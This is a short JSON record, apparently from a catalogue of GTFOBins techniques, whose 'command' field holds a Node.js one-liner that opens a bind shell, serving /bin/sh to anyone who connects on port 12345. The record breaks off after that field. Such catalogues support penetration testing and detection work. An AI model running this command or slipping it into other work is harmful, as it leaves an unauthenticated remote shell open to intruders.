{
  "id": "gtfo-node-bind-shell",
  "name": "GTFOBins · node (bind-shell)",
  "command": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'",
